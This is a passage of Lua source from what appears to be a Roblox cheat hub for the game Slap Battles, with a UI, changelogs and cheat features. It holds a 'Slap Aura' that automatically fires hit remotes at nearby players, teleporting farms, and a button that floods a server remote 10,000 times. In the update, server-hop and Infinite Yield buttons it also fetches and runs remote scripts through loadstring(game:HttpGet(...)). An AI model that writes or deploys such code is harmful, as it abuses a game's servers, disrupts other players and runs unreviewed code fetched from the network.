	while true do
		if spammingbrickasd then
			game.ReplicatedStorage.lbrick:FireServer()
		task.wait(2.4)
		else
			task.wait(0.5)
		end
	end
end)

    Tabs.Info:AddButton({
        Title = "Check for updates",
        Description = "Checks for updates",
        Callback = function()
            if HttpService then
                local response = HttpService({Url = url, Method = "GET"})
                if response and response.StatusCode == 200 then
                    local data = game:GetService("HttpService"):JSONDecode(response.Body)
                    local remoteVersion = tonumber(data.Version)
                    local announcement = data.Announcement
    
                    if remoteVersion and remoteVersion ~= currentVersion and remoteVersion > currentVersion then
                        Window:Dialog({
                            Title = "Update Available!",
                              Content = "Update: " .. currentVersion .. " -> " .. remoteVersion .. "\nAnnouncement by developer: " .. (announcement or "No announcement provided."),
                            Buttons = {
                                {
                                    Title = "Update",
                                    Callback = function()
                                    vinqVerified:Destroy()
                                        theframeig:Destroy()
                                        loadstring(game:HttpGet("https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/refs/heads/main/lol.txt"))()
                                    end
                                },
                                {
                                    Title = "Stay",
                                    Callback = function()
                                        warn("Staying on version: " .. currentVersion)
                                    end
                                }
                            }
                        })
                    else
                        Window:Dialog({
                            Title = "You're up to date",
                            Content = "There is no update as of " .. os.date("%Y-%m-%d"),
                            Buttons = {
                                {
                                    Title = "Got it"
                                }
                            }
                        })
                    end
                else
                    print("Failed to fetch version info.")
                end
            else
                Window:Dialog({
                    Title = "Failed to get HTTP requests",
                    Content = [[
    If you are running an older version, we will not prompt you with any updates.
    Report this in the discord.]],
                    Buttons = {
                        {
                            Title = "I understand"
                        }
                    }
                })
            end
        end
    })
	local nooneshots
	if game.Workspace.Lobby:FindFirstChild("Teleport3") then
 nooneshots = workspace.Lobby.Teleport3
end
   
    Tabs.Changelogs:AddParagraph({
        Title = "V3.25",
        Content = "30. January[2025]\n+ Added El Gato Slap Farm\n+ Added Troll Section \n+ Added Brick all \n+ Added Sbeve All \n+ Bug fixes & other cool stuff!"
    })
    Tabs.Changelogs:AddParagraph({
        Title = "V3.24",
        Content = "28. January[2025]\n+ Added Guide Support \n+ Added Better Autoload"
    })
    Tabs.Changelogs:AddParagraph({
        Title = "V3.22/V3.23",
        Content = "January [2025]\n+ Added OP Boxer Slap Farm\n+ Added Cherry Stuff \n+ Bug fixes & other cool stuff!"
    })

    Tabs.Changelogs:AddParagraph({
        Title = "V3.21",
        Content = "7. January [2025]\n+ Added Slapple Farm Serverhop (beta)\n+ Added beat drop bum bum did dum bum bum did bop bop (HEAR DA BEAT)"
    })

Tabs.Changelogs:AddParagraph({
    Title = "V3.2",
    Content = [[
    3. January [2025]
    First off, happy new year!!
    Here are the big Changelogs:

            VINQ SB
    + Added: Get Glovel Glove
    + Added: Get Bomb Glove
    ~ Changed: Sections have been re-organized and some renamed
    ~ Changed: Made the newest updates be at the top instead of the bottom.
    ~ Changed: Optimized & made Slap Aura a tiny bit faster.
    ~ Changed: Themnostedgyguy approved this update a little to hard.
    ~ Changed: Star has been patched to cause less lag, so it has been moved to Miscellaneous
    - Removed: Christmas Event (its still in the code im easily able to bring it back)
    - Removed: Feedback
    
    
        + ADDED SLAP ROYALE SUPPORT!!!!!
            VINQ SR
    Features:
    Autowin, Autocollect, Autocollect nearby, Auto votekick, Slap Aura, Jump Out Of Bus Early, and more (i wrote this out of memory ALRIGHT)!
    (Note: Early Version. Bugs may occur.)
    ]]
})
Tabs.Changelogs:AddParagraph({
    Title = "[HOTFIX]",
    Content = [[
    26. December [2024]
    + Fixed Get Kinetc
    + Fixed Slap Aura
    ]]
})
Tabs.Changelogs:AddParagraph({
    Title = "[PUBLIC RELEASE]",
    Content = [[
    26. December [2024]
    SORRY FOR THE DELAY
    + More glove support for Slap Aura
    + Slap aura cooldown is now more accurate.
    + Slap Aura now detects when you change glove.
    + Don't hit friends button (Slap Aura)
    + Get Kinetic
    + Fixed sending feedback when loading a config.
    ~ Public Release!!!
    ]]
})
Tabs.Changelogs:AddParagraph({
    Title = "[HOTFIX]",
    Content = [[
    23. December [2024]
    + UI Adjustments
    + Fixed antiragdoll giving you a death loop.
    + You can no longer get 2 GUIS at once.
    ]]
})
Tabs.Changelogs:AddParagraph({
    Title = "[TESTERS BETA]",
    Content = [[
    22. December [2024]
    + Added Autoupdates
    + Added back Anti Star (now no longer spams your console and making your condition worse!)
    + Added a Christmas Category
        + Auto get peeps
        + Teleport to Christmas Island
    + Added Get Elude in Glove Obtainment
        + Get Counter
        + Get Elude
    + Bug Fixes
    + UI Improvements
    + Credits
    + Added Feedback (exists till end of beta)
    + Made themnostedgyguy stop edging
    + Vinq now detects your Executor
    - Removed DashSFXSpam
    ]]
})
Tabs.Changelogs:AddParagraph({
    Title = "[TESTERS BETA]",
    Content = [[
    16. December [2024]
    - Added a new category for lag, star and Glovel Lag
    - Updated some Icons
    - Fixed minor bugs in the UI.
    ]]
})
Tabs.Changelogs:AddParagraph({
    Title = "Opened for Testers",
    Content = "16. December [2024]"
})
Tabs.Changelogs:AddParagraph({
    Title = "Downtime began",
    Content = "6. October [2024]"
})
Tabs.Changelogs:AddParagraph({
    Title = "Discord Pre-release.",
    Content = "4. October [2024]"
})
Tabs.Changelogs:AddParagraph({
    Title = "Updated to Version 3 developer beta.",
    Content = "1. October [2024]"
})
Tabs.Changelogs:AddParagraph({
    Title = "VINQ Development started",
    Content = [[
    Prior to October 1.
    VINQ WINK HUB was created.
    VINQ WINK was in beta for ~2 weeks, and was publicly available
    ]]
})

    --[[ SECTIONS ]]
    local AntivoidSection = Tabs.Antis:AddSection("Antivoid")
    local GeneralSec = Tabs.Antis:AddSection("General")
    local SlapsSection  = Tabs.SlapAura:AddSection("Combat")
    local SlappleSection = Tabs.Main:AddSection("Slaps")
    local GloveObtainment  = Tabs.Other:AddSection("Badge Obtainment")
    local Misc = Tabs.Main:AddSection("Miscellaneous")
    local CauseLag = Tabs.Lag:AddSection("Lag Induction")
    local Prevent = Tabs.Lag:AddSection("Lag Prevention")
	
	
    local MiscellaneousSection = Tabs.Other:AddSection("Miscellaneous")
    
   

        MiscellaneousSection:AddButton({
            Title = "Give Cherry Clones No Slap CD",
            Description = "Cherry clones will not have a slap cooldown.",
            Callback = function()
                task.spawn(function()
                    while task.wait(0.05) do
                        if workspace:FindFirstChild("cherry_storage") then 
                    for _, cherry in pairs(workspace.cherry_storage:GetChildren()) do
                        if cherry:IsA("Model") and cherry:FindFirstChild("clone_remote") then
                    
                            cherry.clone_remote:FireServer()
                        end
                    end
                    end
                    end
                    end)
                    local generalAbility = game.ReplicatedStorage:FindFirstChild("GeneralAbility")
                    if generalAbility and generalAbility:IsA("RemoteEvent") then
                        while true do
                            if game.Players.LocalPlayer.leaderstats.Glove.Value == "Cherry" and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("isInArena") and game.Players.LocalPlayer.Character.isInArena.Value == true then
                            generalAbility:FireServer()
                            
                            end
                            task.wait(0.1)
                        end
                    end
            end
        })

    --[[END OF SECTIONS]]

SlappleTpFarm = SlappleSection:AddToggle("Slapple TP Farm", {
    Title = "Slapple server hop farm", 
    Description = "Can be used by low end executors, even if not supported. Hopefully [BETA, MIGHT BREAK] \nYou need to leave to stop this process or wait till it breaks",
    Default = false,
    Callback = function(state)
        if state then
            getgenv().slapplefarmFOREVERyeahh = true
            local slapples = game.Workspace.Arena.island5.Slapples
            repeat task.wait(0.2) until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if game.Players.LocalPlayer.Character.isInArena.Value == false then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Lobby.Teleport2.CFrame
                task.wait(0.5)
            end
            for _, v in pairs(slapples:GetChildren()) do
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Glove.CFrame
                wait(0.1)
            end

          
            if queueteleport then
                local scriptURL1 = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/main/lol.txt"
                local scriptURL2 = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/main/shing%20shang%20dong!"
                
           
                queueteleport([[
                    loadstring(game:HttpGet("]] .. scriptURL1 .. [[", true))();
                    wait(1);
                    loadstring(game:HttpGet("]] .. scriptURL2 .. [[", true))();
                ]])
            else
                warn("queueteleport function is not defined!")
            end
           
          
		if queueteleport then
                local scriptURL1 = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/main/lol.txt"
                local scriptURL2 = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/main/shing%20shang%20dong!"
                
              
                queueteleport([[
                    loadstring(game:HttpGet("]] .. scriptURL1 .. [[", true))();
                    wait(1);
                    loadstring(game:HttpGet("]] .. scriptURL2 .. [[", true))();
                ]])
            else
                warn("queueteleport function is not defined!")
            end
         
            local placeIds = {9015014224, 6403373529, 11520107397}
            local currentPlaceId = game.PlaceId
            local availablePlaces = {}

            for _, id in ipairs(placeIds) do
                if id ~= currentPlaceId then
                    table.insert(availablePlaces, id)
                end
            end

            if #availablePlaces > 0 then
                local destination = availablePlaces[math.random(1, #availablePlaces)]
                game:GetService("TeleportService"):Teleport(destination, game:GetService("Players").LocalPlayer)
            else
                warn("No valid place to teleport!")
            end
		 
        end
    end
})

task.spawn(function()
    while task.wait(3) do
        if getgenv().slapplefarmFOREVERyeahh then
            SlappleTpFarm:SetValue(true)
        end
    end
end)

    local Antifall = AntivoidSection:AddToggle("Antifall", 
    
    {
        Title = "Antifall", 
        Description = "Adds a part below the island so you cannot fall",
        Default = false,
        Callback = function(state)
        if state then
            part.Transparency = 0.5
            part.CanCollide = true
        else
            part.Transparency = 1
            part.CanCollide = false
            end
        end 
    })
     local Antifall2 = AntivoidSection:AddToggle("Antifall2", 
    
    {
        Title = "Antifall V2", 
        Description = "Adds alot of parts so you cannot fall; also matches with Slapple Island, Moai and tournament.",
        Default = false,
        Callback = function(state)
        if state then
            for _, v in pairs(antivoidmodel:GetChildren()) do
                v.CanCollide = true
                v.Transparency = 0.72
          end
        else
            for _, v in pairs(antivoidmodel:GetChildren()) do
                v.CanCollide = false
                v.Transparency = 1
          end
            end
        end 
    })
    Tabs.Main:AddButton({
        Title = "Execute Infinite Yield",
        Description = "",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
        end
    })
    local UIS = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")


local toggleEnabled69420 = false

local function handleInput()
    if not toggleEnabled69420 then return end
    
    local character = game.Players.LocalPlayer.Character
    if not character then return end
    
    local tool = character:FindFirstChildWhichIsA("Tool")
    if not tool then return end
    
    local glove = tool:FindFirstChild("Glove")
    if not glove then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    
    local animator = humanoid:FindFirstChildOfClass("Animator")
    if not animator then return end
    
    local animation = ReplicatedStorage:FindFirstChild(tool.Name == "Dual" and "DualSlap" or "Slap")
    if not animation then return end
    
    local animationTrack = animator:LoadAnimation(animation)
    animationTrack:Play()
end
Misc:AddButton({
    Title = "Pusher Spam",
    Description = "Spams alot of pusher ability! needs pusher glove \nWARNING! WILL GET YOU KICKED! MAKE SURE TO HAVE A WAY TO REJOIN",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value ~= "Pusher" then
		Fluent:Notify({
        Title = "Equip Pusher",
        Content = "Please Equip Pusher!",
        SubContent = "",  
        Duration = 5 
})
			return
		end
		Window:Dialog({
    Title = "Wait!",
    Content = "This will get you kicked!\nAlso we recommend using IY Spin with this",
    Buttons = {
        { 
            Title = "Continue",
            Callback = function()
             for i = 1, 10000 do
	game:GetService("ReplicatedStorage").PusherWall:FireServer()
end
            end 
        }, {
            Title = "Cancel",
           
        }
    }
})
    end
})

UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        handleInput()
    end
end)


    local function toggleskbiid(thingtotoggle)
        thingtotoggle:SetValue(false)
    end
    gloveHits = {
        ["Default"] = game.ReplicatedStorage.b,
        ["Extended"] = game.ReplicatedStorage.b,
        -----------// Glove Hit General Or New Glove \\-----------
        ["T H I C K"] = game.ReplicatedStorage.GeneralHit,
        ["Squid"] = game.ReplicatedStorage.GeneralHit,
        ["Gummy"] = game.ReplicatedStorage.GeneralHit,
        ["RNG"] = game.ReplicatedStorage.GeneralHit,
        ["Tycoon"] = game.ReplicatedStorage.GeneralHit,
        ["Charge"] = game.ReplicatedStorage.GeneralHit,
        ["Baller"] = game.ReplicatedStorage.GeneralHit,
        ["Tableflip"] = game.ReplicatedStorage.GeneralHit,
        ["Booster"] = game.ReplicatedStorage.GeneralHit,
        ["Shield"] = game.ReplicatedStorage.GeneralHit,
        ["Track"] = game.ReplicatedStorage.GeneralHit,
        ["Goofy"] = game.ReplicatedStorage.GeneralHit,
        ["Confusion"] = game.ReplicatedStorage.GeneralHit,
        ["Elude"] = game.ReplicatedStorage.GeneralHit,
        ["Glitch"] = game.ReplicatedStorage.GeneralHit,
        ["Snowball"] = game.ReplicatedStorage.GeneralHit,
        ["fish"] = game.ReplicatedStorage.GeneralHit,
        ["Killerfish"] = game.ReplicatedStorage.GeneralHit,
        ["🗿"] = game.ReplicatedStorage.GeneralHit,
        ["Obby"] = game.ReplicatedStorage.GeneralHit,
        ["Voodoo"] = game.ReplicatedStorage.GeneralHit,
        ["Leash"] = game.ReplicatedStorage.GeneralHit,
        ["Flamarang"] = game.ReplicatedStorage.GeneralHit,
        ["Berserk"] = game.ReplicatedStorage.GeneralHit,
        ["Quake"] = game.ReplicatedStorage.GeneralHit,
        ["Rattlebones"] = game.ReplicatedStorage.GeneralHit,
        ["Chain"] = game.ReplicatedStorage.GeneralHit,
        ["Ping Pong"] = game.ReplicatedStorage.GeneralHit,
        ["Whirlwind"] = game.ReplicatedStorage.GeneralHit,
        ["Slicer"] = game.ReplicatedStorage.GeneralHit,
        ["Counter"] = game.ReplicatedStorage.GeneralHit,
        ["Hammer"] = game.ReplicatedStorage.GeneralHit,
        ["Excavator"] = game.ReplicatedStorage.GeneralHit,
        ["Home Run"] = game.ReplicatedStorage.GeneralHit,
        ["Psycho"] = game.ReplicatedStorage.GeneralHit,
        ["Kraken"] = game.ReplicatedStorage.GeneralHit,
        ["Gravity"] = game.ReplicatedStorage.GeneralHit,
        ["Lure"] = game.ReplicatedStorage.GeneralHit,
        ["Jebaited"] = game.ReplicatedStorage.GeneralHit,
        ["Meteor"] = game.ReplicatedStorage.GeneralHit,
        ["Tinkerer"] = game.ReplicatedStorage.GeneralHit,    
        ["Guardian Angel"] = game.ReplicatedStorage.GeneralHit,
        ["Sun"] = game.ReplicatedStorage.GeneralHit,
        ["Necromancer"] = game.ReplicatedStorage.GeneralHit,
        ["Zombie"] = game.ReplicatedStorage.GeneralHit,
        ["Dual"] = game.ReplicatedStorage.GeneralHit,
		["Roguelike"] = game.ReplicatedStorage.GeneralHit,
        ["Alchemist"] = game.ReplicatedStorage.GeneralHit,
        ["Parry"] = game.ReplicatedStorage.GeneralHit,
        ["Druid"] = game.ReplicatedStorage.GeneralHit,
        ["Oven"] = game.ReplicatedStorage.GeneralHit,
        ["Jester"] = game.ReplicatedStorage.GeneralHit,
        ["Ferryman"] = game.ReplicatedStorage.GeneralHit,
        ["Scythe"] = game.ReplicatedStorage.GeneralHit,
        ["Blackhole"] = game.ReplicatedStorage.GeneralHit,
        ["Santa"] = game.ReplicatedStorage.GeneralHit,
        ["Grapple"] = game.ReplicatedStorage.GeneralHit,
        ["Iceskate"] = game.ReplicatedStorage.GeneralHit,
        ["Pan"] = game.ReplicatedStorage.GeneralHit,
        ["Blasphemy"] = game.ReplicatedStorage.GeneralHit,
        ["Blink"] = game.ReplicatedStorage.GeneralHit,
        ["Ultra Instinct"] = game.ReplicatedStorage.GeneralHit,
        ["Admin"] = game.ReplicatedStorage.GeneralHit,
        ["Prop"] = game.ReplicatedStorage.GeneralHit,
        ["Joust"] = game.ReplicatedStorage.GeneralHit,
        ["Slapstick"] = game.ReplicatedStorage.GeneralHit,
        ["Firework"] = game.ReplicatedStorage.GeneralHit,
        ["Run"] = game.ReplicatedStorage.GeneralHit,
        ["Beatdown"] = game.ReplicatedStorage.GeneralHit,
        ["L.O.L.B.O.M.B"] = game.ReplicatedStorage.GeneralHit,
        ["Glovel"] = game.ReplicatedStorage.GeneralHit,
        ["Chicken"] = game.ReplicatedStorage.GeneralHit,
        ["Divebomb"] = game.ReplicatedStorage.GeneralHit,
        ["Lamp"] = game.ReplicatedStorage.GeneralHit,
        ["Pocket"] = game.ReplicatedStorage.GeneralHit,
        ["BONK"] = game.ReplicatedStorage.GeneralHit,
        ["Knockoff"] = game.ReplicatedStorage.GeneralHit,
        ["Divert"] = game.ReplicatedStorage.GeneralHit,
        ["Frostbite"] = game.ReplicatedStorage.GeneralHit,
        ["Sbeve"] = game.ReplicatedStorage.GeneralHit,
        ["Plank"] = game.ReplicatedStorage.GeneralHit,
        ["Golem"] = game.ReplicatedStorage.GeneralHit,
        ["Spoonful"] = game.ReplicatedStorage.GeneralHit,
        ["Grab"] = game.ReplicatedStorage.GeneralHit,
        ["the schlop"] = game.ReplicatedStorage.GeneralHit,
        ["UFO"] = game.ReplicatedStorage.GeneralHit,
        ["el gato"] = game.ReplicatedStorage.GeneralHit,
        ["Siphon"] = game.ReplicatedStorage.GeneralHit,
        ["Hive"] = game.ReplicatedStorage.GeneralHit,
        ["Wrench"] = game.ReplicatedStorage.GeneralHit,
        ["Hunter"] = game.ReplicatedStorage.GeneralHit,
        ["Relude"] = game.ReplicatedStorage.GeneralHit,
        ["Avatar"] = game.ReplicatedStorage.GeneralHit,
        ["Demolition"] = game.ReplicatedStorage.GeneralHit,
        ["Shotgun"] = game.ReplicatedStorage.GeneralHit,
        ["Beachball"] = game.ReplicatedStorage.GeneralHit,
        -----------// Glove Hit Normal Or New Glove \\-----------
        ["ZZZZZZZ"] = game.ReplicatedStorage.ZZZZZZZHit,
        ["Brick"] = game.ReplicatedStorage.BrickHit,
        ["Snow"] = game.ReplicatedStorage.SnowHit,
        ["Pull"] = game.ReplicatedStorage.PullHit,
        ["Flash"] = game.ReplicatedStorage.FlashHit,
        ["Spring"] = game.ReplicatedStorage.springhit,
        ["Swapper"] = game.ReplicatedStorage.HitSwapper,
        ["Bull"] = game.ReplicatedStorage.BullHit,
        ["Dice"] = game.ReplicatedStorage.DiceHit,
        ["Ghost"] = game.ReplicatedStorage.GhostHit,
        ["Stun"] = game.ReplicatedStorage.HtStun,
        ["Za Hando"] = game.ReplicatedStorage.zhramt,
        ["Fort"] = game.ReplicatedStorage.Fort,
        ["Magnet"] = game.ReplicatedStorage.MagnetHIT,
        ["Pusher"] = game.ReplicatedStorage.PusherHit,
        ["Anchor"] = game.ReplicatedStorage.hitAnchor,
        ["Space"] = game.ReplicatedStorage.HtSpace,
        ["Boomerang"] = game.ReplicatedStorage.BoomerangH,
        ["Speedrun"] = game.ReplicatedStorage.Speedrunhit,
        ["Mail"] = game.ReplicatedStorage.MailHit,
        ["Golden"] = game.ReplicatedStorage.GoldenHit,
        ["MR"] = game.ReplicatedStorage.MisterHit,
        ["Reaper"] = game.ReplicatedStorage.ReaperHit,
        ["Replica"] = game.ReplicatedStorage.ReplicaHit,
        ["Defense"] = game.ReplicatedStorage.DefenseHit,
        ["Killstreak"] = game.ReplicatedStorage.KSHit,
        ["Reverse"] = game.ReplicatedStorage.ReverseHit,
        ["Shukuchi"] = game.ReplicatedStorage.ShukuchiHit,
        ["Duelist"] = game.ReplicatedStorage.DuelistHit,
        ["woah"] = game.ReplicatedStorage.woahHit,
        ["Ice"] = game.ReplicatedStorage.IceHit,
        ["Adios"] = game.ReplicatedStorage.hitAdios,
        ["Blocked"] = game.ReplicatedStorage.BlockedHit,
        ["Engineer"] = game.ReplicatedStorage.engiehit,
        ["Rocky"] = game.ReplicatedStorage.RockyHit,
        ["Conveyor"] = game.ReplicatedStorage.ConvHit,
        ["STOP"] = game.ReplicatedStorage.STOP,
        ["Phantom"] = game.ReplicatedStorage.PhantomHit,
        ["Wormhole"] = game.ReplicatedStorage.WormHit,
        ["Acrobat"] = game.ReplicatedStorage.AcHit,
        ["Plague"] = game.ReplicatedStorage.PlagueHit,
        ["[REDACTED]"] = game.ReplicatedStorage.ReHit,
        ["bus"] = game.ReplicatedStorage.hitbus,
        ["Phase"] = game.ReplicatedStorage.PhaseH,
        ["Warp"] = game.ReplicatedStorage.WarpHt,
        ["Bomb"] = game.ReplicatedStorage.BombHit,
        ["Bubble"] = game.ReplicatedStorage.BubbleHit,
        ["Jet"] = game.ReplicatedStorage.JetHit,
        ["Shard"] = game.ReplicatedStorage.ShardHIT,
        ["potato"] = game.ReplicatedStorage.potatohit,
        ["CULT"] = game.ReplicatedStorage.CULTHit,
        ["bob"] = game.ReplicatedStorage.bobhit,
        ["Buddies"] = game.ReplicatedStorage.buddiesHIT,
        ["Spy"] = game.ReplicatedStorage.SpyHit,
        ["Detonator"] = game.ReplicatedStorage.DetonatorHit,
        ["Rage"] = game.ReplicatedStorage.GRRRR,
        ["Trap"] = game.ReplicatedStorage.traphi,
        ["Orbit"] = game.ReplicatedStorage.Orbihit,
        ["Hybrid"] = game.ReplicatedStorage.HybridCLAP,
        ["Slapple"] = game.ReplicatedStorage.SlappleHit,
        ["Disarm"] = game.ReplicatedStorage.DisarmH,
        ["Dominance"] = game.ReplicatedStorage.DominanceHit,
        ["Link"] = game.ReplicatedStorage.LinkHit,
        ["Rojo"] = game.ReplicatedStorage.RojoHit,
        ["rob"] = game.ReplicatedStorage.robhit,
        ["Rhythm"] = game.ReplicatedStorage.rhythmhit,
        ["Nightmare"] = game.ReplicatedStorage.nightmarehit,
        ["Hitman"] = game.ReplicatedStorage.HitmanHit,
        ["Thor"] = game.ReplicatedStorage.ThorHit,
        ["Retro"] = game.ReplicatedStorage.RetroHit,
        ["Cloud"] = game.ReplicatedStorage.CloudHit,
        ["Null"] = game.ReplicatedStorage.NullHit,
        ["spin"] = game.ReplicatedStorage.spinhit,
        -----------// Glove Hit Stun \\-----------
        ["Kinetic"] = game.ReplicatedStorage.HtStun,
        ["Recall"] = game.ReplicatedStorage.HtStun,
        ["Balloony"] = game.ReplicatedStorage.HtStun,
        ["Sparky"] = game.ReplicatedStorage.HtStun,
        ["Boogie"] = game.ReplicatedStorage.HtStun,
        ["Stun"] = game.ReplicatedStorage.HtStun,
        ["Coil"] = game.ReplicatedStorage.HtStun,
        -----------// Glove Hit Diamond \\-----------
        ["Diamond"] = game.ReplicatedStorage.DiamondHit,
        ["Megarock"] = game.ReplicatedStorage.DiamondHit,
        -----------// Glove Hit Celestial \\-----------
        ["Moon"] = game.ReplicatedStorage.CelestialHit,
        ["Jupiter"] = game.ReplicatedStorage.CelestialHit,
        -----------// Glove Hard \\-----------
        ["Mitten"] = game.ReplicatedStorage.MittenHit,
        ["Hallow Jack"] = game.ReplicatedStorage.HallowHIT,
        -----------// Glove Hit Power \\-----------
        ["OVERKILL"] = game.ReplicatedStorage.Overkillhit,
        ["The Flex"] = game.ReplicatedStorage.FlexHit,
        ["Custom"] = game.ReplicatedStorage.CustomHit,
        ["God's Hand"] = game.ReplicatedStorage.Godshand,
        ["Error"] = game.ReplicatedStorage.Errorhit
    }
    
        local function toggleskbiid(thingtotoggle)
            thingtotoggle:SetValue(false)
        end
      
local GloveNecessary = false
local ToggleFriendsSlapAura = false
 _G.detectionRadius = 14
local isDetectionEnabled = false
local displayvisually = false
local slapamountantikickmaxed = 3
local visualPart
local ToggleSA
local lastRadius

local function updateVisualPart()
    if not displayvisually then
	warn("DESTROY!")
        if visualPart then
            visualPart:Destroy()
            visualPart = nil
        end
        if game.Workspace:FindFirstChild("somewhatofavisualpart") then
            game.Workspace.somewhatofavisualpart:Destroy()
        end
        return
    end

    local player = game.Players.LocalPlayer
    local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end

    local radius = tonumber(_G.detectionRadius)
    if not radius then return end
    
    if not visualPart then
        visualPart = Instance.new("Part")
        visualPart.Size = Vector3.new(0.1, radius * 2, radius * 2)
        visualPart.Shape = Enum.PartType.Cylinder
        visualPart.Orientation = Vector3.new(0, 0, 90)
        visualPart.Anchored = true
        visualPart.CanCollide = false
        visualPart.BrickColor = BrickColor.new("Bright blue")
        visualPart.Material = Enum.Material.Neon
        visualPart.Transparency = 0.5
        visualPart.Name = "somewhatofavisualpart"
        visualPart.Parent = workspace
        lastRadius = radius
    end

    -- Update size only if detection radius changed
    if radius ~= lastRadius then
        visualPart.Size = Vector3.new(0.1, radius * 2, radius * 2)
        lastRadius = radius
    end

    -- Always update position
    visualPart.Position = humanoidRootPart.Position
end

local playerDebounces = {}
-- Main slap aura toggle function
ToggleSA = SlapsSection:AddToggle("Slap Aura Searcher", {
    Title = "Slap Aura",
    Description = "Not all gloves are supported.",
    Default = false,
    Callback = function(state)
        local slapamountantikick = 0
        local currentRemoteEvent = nil
        local player = game.Players.LocalPlayer
        
        local function removeslapantikickafter1s()
            slapamountantikick = slapamountantikick - 1
        end

        local function getHumanoidRootPart()
            local char = player.Character
            if char then
                return char:FindFirstChild("HumanoidRootPart")
            end
            return nil
        end

         if displayvisually then
					updateVisualPart()
				end
        
        -- Set up a heartbeat connection for continuous updating of visual part
   

        if state then
            
            isDetectionEnabled = true
            local gloveValue = player.leaderstats and player.leaderstats:FindFirstChild("Glove") and player.leaderstats.Glove.Value
            local foundRemote = false

            if gloveValue then
                if gloveValue == "Extended" then
                    _G.detectionRadius = 25
                end
                local remoteCandidate = gloveHits[gloveValue]
                if remoteCandidate then
                    currentRemoteEvent = remoteCandidate
                    foundRemote = true
                  
                end
            end

            if gloveValue and not foundRemote and (gloveValue ~= "Default" and gloveValue ~= "Relude" and gloveValue ~= "Thick" and gloveValue ~= "Titan") then
                for _, remote in pairs(game.ReplicatedStorage:GetChildren()) do
                    if remote:IsA("RemoteEvent") and (remote.Name:lower():match(gloveValue:lower() .. "h$") or remote.Name:lower():match(gloveValue:lower() .. "hit$")) then
                        currentRemoteEvent = remote
                        foundRemote = true
                       
                        break
                    end
                end
            end

            if foundRemote then
                
            else
                isDetectionEnabled = false
                currentRemoteEvent = nil
                Title = "Glove returned nil"
                Window:Dialog({
                    Title = "This glove is not supported.",
                    Content = "Report this in Feedback or in the Discord.",
                    Buttons = {
                        { Title = "Got it" }
                    }
                })
                wait(1)
                ToggleSA:SetValue(false)
                Title = "Slap Aura"
                
                -- Clean up connections if we're returning early
                if characterAddedConnection then
                    characterAddedConnection:Disconnect()
                end
                if visualUpdateConnection then
                    visualUpdateConnection:Disconnect()
                end
                return
            end
            
            -- Initialize or update visual part
          
            
            -- Start the slap aura loop
            while isDetectionEnabled do
                task.wait(0)
				if displayvisually then
					updateVisualPart()
				end
                -- Check if player is in arena
                local humanoidRootPart = getHumanoidRootPart()
                local isPlayerInArena = false
                
                if player.Character then
                    local isInArena = player.Character:FindFirstChild("isInArena")
                    if isInArena and isInArena:IsA("BoolValue") and isInArena.Value then
                        isPlayerInArena = true
                    end
                end
                
                if not isPlayerInArena then
                    continue
                end

                -- Skip if missing required components
                if not humanoidRootPart or not currentRemoteEvent or not isDetectionEnabled then
                    continue
                end

                -- Get all players in the game
                for _, targetPlayer in pairs(game.Players:GetPlayers()) do
                    -- Skip self and already debounced players
                    if targetPlayer == player or playerDebounces[targetPlayer.Name] then
                        continue
                    end
					
                    -- Skip if slap amount exceeds max
                    if slapamountantikick >= slapamountantikickmaxed then
                        continue
                    end

                    -- Check if target has necessary components
                    local targetCharacter = targetPlayer.Character
                    if not targetCharacter then
                        continue
                    end

                    local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
                    if not targetHRP then
                        continue
                    end

                    -- Check if in range using magnitude
                    local radius = tonumber(_G.detectionRadius)
                    local distance = (targetHRP.Position - humanoidRootPart.Position).Magnitude
                    if type(distance) == "number" and distance > radius then
                        continue
                    end

                    -- Check if we should skip friends
                    if ToggleFriendsSlapAura and player:IsFriendsWith(targetPlayer.UserId) then
                        continue
                    end
                    
                    -- Skip if target has Reversed effect
                    if targetCharacter:FindFirstChild("Reversed") then
                        continue
                    end
                    
                    -- Skip if glove is required but not equipped
                    if GloveNecessary and not player.Character:FindFirstChildWhichIsA("Tool") then
                        continue
                    end
                    
                    -- Check if target is vulnerable and in arena
                    local tsVulnerability = targetCharacter:FindFirstChild("TSVulnerability")
                    local targetInArena = targetCharacter:FindFirstChild("isInArena")
                    local targetLeaderstats = targetPlayer:FindFirstChild("leaderstats")
                    local targetGlove = targetLeaderstats and targetLeaderstats:FindFirstChild("Glove")
                    
                    if tsVulnerability and tsVulnerability.Value == true and
                       not targetCharacter:FindFirstChild("rock") and
                       targetInArena and targetInArena.Value == true and
                       targetGlove and targetGlove.Value ~= "Spectator" then
                        
                        -- Apply debounce and slap the target
                        playerDebounces[targetPlayer.Name] = true
                        slapamountantikick = slapamountantikick + 1
                        currentRemoteEvent:FireServer(targetHRP)
                        
                        -- Adjust debounce time based on target's state
                        task.wait(0.02)
                        if targetCharacter:FindFirstChild("FakePart Right Leg") or
                           (targetCharacter:FindFirstChild("Torso") and targetCharacter.Torso:FindFirstChild("a0")) or
                           (targetGlove and targetGlove.Value == "Ultra Instinct") then
                            task.delay(1.6, function()
                                playerDebounces[targetPlayer.Name] = nil
                                task.delay(2.65, removeslapantikickafter1s)
                            end)
                        else
                            task.delay(0.08, function()
                                playerDebounces[targetPlayer.Name] = nil
                                task.delay(0.08, removeslapantikickafter1s)
                            end)
                        end
